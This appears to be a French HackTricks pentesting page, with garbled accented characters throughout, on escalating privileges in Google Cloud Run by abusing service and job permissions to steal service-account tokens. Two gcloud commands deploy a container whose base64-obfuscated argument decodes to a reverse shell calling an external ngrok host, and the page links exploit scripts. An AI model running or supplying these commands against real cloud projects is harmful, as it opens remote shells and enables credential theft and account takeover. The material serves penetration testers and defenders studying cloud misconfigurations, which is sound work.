# GCP - Ex√©cution de Privesc

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez** üí¨ [**le groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de piratage en soumettant des PR aux** [**d√©p√¥ts Github de HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## run

### `run.services.create`, `iam.serviceAccounts.actAs`

Similaire √† la m√©thode _cloudfunctions.functions.create_, cette m√©thode cr√©e un **nouveau service Cloud Run** qui, lorsqu'il est invoqu√©, **renvoie le jeton d'acc√®s du compte de service** en acc√©dant √† l'API de m√©tadonn√©es du serveur sur lequel il s'ex√©cute. Un service Cloud Run sera d√©ploy√© et une requ√™te peut √™tre effectu√©e pour obtenir le jeton.

Les **autorisations suivantes sont requises** pour cette m√©thode :

* _run.services.create_
* _iam.serviceaccounts.actAs_
* _run.services.setIamPolicy_ **OU** _run.routes.invoke_

![](https://rhinosecuritylabs.com/wp-content/uploads/2020/04/image8-1000x503.png)

Cette m√©thode utilise une image Docker incluse qui doit √™tre construite et h√©berg√©e pour √™tre exploit√©e correctement. L'image est con√ßue pour indiquer √† Cloud Run de r√©pondre avec le jeton d'acc√®s du compte de service lorsqu'une requ√™te HTTP est effectu√©e.

Le script d'exploitation pour cette m√©thode peut √™tre trouv√© [ici](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/run.services.create.py) et l'image Docker peut √™tre trouv√©e [ici](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudRunDockerImage).

Pour une raison quelconque, lors de l'utilisation de `gcloud run deploy` au lieu de simplement cr√©er le service, **il a besoin de l'autorisation de mise √† jour**. V√©rifiez un [**exemple ici**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/o-run.services.create.sh).

### `run.services.update`, `iam.serviceAccounts.actAs`

Comme le pr√©c√©dent, mais en mettant √† jour un service

```bash
gcloud run deploy hacked \
--image=marketplace.gcr.io/google/ubuntu2004 \
--command=bash \
--args="-c,echo c2ggLWkgPiYgL2Rldi90Y3AvNy50Y3AuZXUubmdyb2suaW8vMTQ4NDEgMD4mMQ== | base64 -d | bash" \
--service-account="<proj-num>-compute@developer.gserviceaccount.com" \
--region=us-central1 \
--allow-unauthenticated
```

### `run.services.setIamPolicy`

Donnez-vous les autorisations pr√©c√©dentes.

### `run.jobs.create`, `run.jobs.run`, (`run.jobs.get`)

Lancez un travail avec un shell invers√© pour voler le compte de service indiqu√© dans la commande. Vous pouvez trouver un [**exploit ici**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/m-run.jobs.create.sh).

### `run.jobs.update`, `run.jobs.run`, `iam.serviceaccounts.actAs`, (`run.jobs.get`)

Similaire au pr√©c√©dent, il est possible de **mettre √† jour un travail et de mettre √† jour le compte de service**, la **commande** et de l'**ex√©cuter** :

```bash
gcloud beta run jobs update hacked \
--image=marketplace.gcr.io/google/ubuntu2004 \
--command=bash \
--args="-c,echo c2ggLWkgPiYgL2Rldi90Y3AvNy50Y3AuZXUubmdyb2suaW8vMTQ4NDEgMD4mMQ== | base64 -d | bash" \
--service-account=<proj-num>-compute@developer.gserviceaccount.com \
--region=us-central1 \
--project=security-devbox --execute-now
```

### `run.jobs.setIamPolicy`

Donnez-vous les autorisations pr√©c√©dentes.

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez** üí¨ [**le groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de piratage en soumettant des PR aux** [**d√©p√¥ts Github de HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>